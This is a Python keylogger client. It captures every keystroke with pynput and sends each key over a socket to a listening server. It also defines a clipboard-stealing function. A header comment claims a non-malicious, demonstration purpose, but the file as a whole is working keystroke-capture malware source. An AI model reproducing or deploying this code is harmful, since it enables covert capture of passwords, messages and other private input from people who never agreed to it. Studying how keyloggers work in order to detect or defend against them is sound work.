# ----------------------------------------------------------------------------
# Created By  : Michael Vasilio
# Created Date: 23/05/23
# Version = '0.0.1'
# Description: The client will collect keystrokes from the user and has the ability to copy the entire clipboard (text only)
# NOTE: This is not for malicious purposes but to demonstrate a key logging concept.
# ---------------------------------------------------------------------------
import socket

from pynput import keyboard

from pyperclip import paste
from pyperclip import copy


# Get host name
host = socket.gethostname()
# Set port
port = 9999
# Create socket
s = socket.socket()
# Connect to server
s.connect((host, port))


# Optional clipboard steal (text-only)
def steal_clipboard():
    # Paste it into a string
    stolen_item = paste()
    # Copy it back to clipboard
    copy(stolen_item)
    # Save the stolen information
    return stolen_item


def on_keypress(in_key):
    try:
        # If a keyboard character is pressed & is not numerical or alphabetical
        keyboard_char = in_key.char
        # Print to terminal
        print(f"Logged: {keyboard_char}")
        # Send the key logs to server
        msg = str(in_key)
        s.send(msg.encode())
    except AttributeError as e:
        # This handles any character that aren't regular chars
        special_characters = [keyboard.Key.esc, keyboard.Key.space, keyboard.Key.enter, keyboard.Key.backspace,
                              keyboard.Key.alt, keyboard.Key.caps_lock, keyboard.Key.tab, keyboard.Key.shift,
                              keyboard.Key.delete]
        # Iterate over the list of special chars
        for i in special_characters:
            # If input key equals the special key above
            if in_key == i:
                # Log it
                print(f"[Not Letter] Log: {i.name}")
                msg = str(i.name)
                s.send(msg.encode())


def on_keyrelease(in_key):
    # If escape is pressed
    if in_key == keyboard.Key.esc:
        # Send termination message to server
        s.send("-CLOSECONNECTION".encode())
        # Close socket
        s.close()
        # stop running the program
        return


# Only execute if this is the main script
if __name__ == "__main__":
    # Create a listener to listen in on keyboard events
    with keyboard.Listener(on_press=on_keypress, on_release=on_keyrelease) as ln:
        ln.join()